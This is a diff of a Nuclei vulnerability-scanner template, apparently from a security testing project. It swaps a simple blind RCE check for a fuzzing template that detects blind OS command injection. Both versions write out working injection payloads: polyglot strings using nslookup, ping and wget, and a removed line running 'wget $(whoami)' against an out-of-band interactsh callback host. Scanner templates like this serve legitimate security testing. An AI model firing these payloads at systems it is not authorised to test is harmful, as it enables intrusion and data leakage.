@@ -1,43 +1,47 @@
-id: blind-rce-dk4trin
+id: fuzz-blind-rce
 
 info:
-  name: dk4trin Blind RCE
-  author: dk4trin
+  name: Blind OS Command Injection
+  author: pdteam,geeknik,otterly
   severity: high
-  description: Blind RCE
-  tags: rce,jndi,oast,blind
+  description: |
+      Potential blind OS command injection vulnerabilities, where the application constructs OS commands using unsanitized user input.
+      Successful exploitation could lead to arbitrary command execution on the system.
+  reference:
+    - https://portswigger.net/research/hunting-asynchronous-vulnerabilities
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
+  tags: cmdi,oast,dast,blind,polyglot
 
-requests:
-  - raw:
-      - |
-        GET /;wget $(whoami).{{interactsh-url}} HTTP/1.1
-        Host: {{hostname}}
-        Content-Type: application/x-www-form-urlencoded
+variables:
+  marker: "{{interactsh-url}}"
 
-      - |
-        GET /;wget $(whoami).{{interactsh-url}} HTTP/1.1
-        Host: {{hostname}}
-        Content-Type: text/html
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
 
-      - |
-        GET /;wget $(whoami).{{interactsh-url}} HTTP/1.1
-        Host: {{hostname}}
+    payloads:
+      interaction:
+        - "&nslookup {{marker}}&'\\\"`0&nslookup {{marker}}&`'"
+        - "1;nslookup${IFS}{{marker}};#${IFS}';nslookup${IFS}{{marker}};#${IFS}\";nslookup${IFS}{{marker}};#${IFS}"
+        - "/*$(nslookup {{marker}})`nslookup {{marker}}``*/-nslookup({{marker}})-'/*$(nslookup {{marker}})`nslookup {{marker}}` #*/-nslookup({{marker}})||'\"||nslookup({{marker}})||\"/*`*/"
+        - "$(ping -c 1 {{marker}} | nslookup {{marker}} ; wget {{marker}} -O /dev/null)"
 
-    matchers-condition: and
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{interaction}}"
+
+    stop-at-first-match: true
     matchers:
       - type: word
-        part: interactsh_protocol  # Confirms the DNS Interaction
+        part: interactsh_protocol
         words:
           - "dns"
 
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
-
-    extractors:
-      - type: regex
-        part: interactsh_request
-        group: 1
-        regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
